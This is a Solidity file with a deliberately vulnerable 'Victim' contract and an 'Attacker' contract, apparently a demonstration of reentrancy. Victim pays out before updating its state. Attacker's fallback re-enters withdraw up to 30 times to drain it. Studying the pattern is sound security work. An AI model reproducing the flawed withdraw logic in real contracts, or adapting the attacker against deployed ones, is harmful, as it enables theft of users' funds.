// SPDX-License-Identifier: GPL-3.0
pragma solidity >= 0.7.0 < 0.9.0 ;

contract Victim {
    uint public owedToAttacker ;
    event Logs ( string message ) ;
    event Response ( bool success , bytes data ) ;
    constructor ( ) { owedToAttacker = 2 ; }
    function withdraw ( ) payable public {
        emit Logs ( "start withdraw" ) ;
        ( bool sent , bytes memory data ) = payable ( msg . sender ) . call { value : owedToAttacker * 10**18 } ( "Completed!" ) ;
        emit Response ( sent , data ) ; emit Logs ( "after withdraw" ) ;
        owedToAttacker = 10 ;
    }
    fallback ( ) external payable { } receive ( ) external payable { }
}

contract Attacker {
    Victim v ; uint public count ;
    event LogFallback ( uint count , uint balance ) ;
    event Logs ( string message ) ;
    event LogsAmount ( string message , uint256 amount ) ;
    constructor ( address victim ) { v = Victim ( payable ( victim )); }
    function attack ( ) payable public { emit Logs ( "before attack" ) ; v . withdraw (); emit Logs ( "after attack" ) ; }
    fallback ( ) external payable {
        emit LogsAmount ( "attacker received" , msg . value ) ; count ++;
        emit LogFallback ( count , address ( this ) . balance ) ; if ( count < 30 ) v . withdraw ();
    }
    receive ( ) external payable { }
}
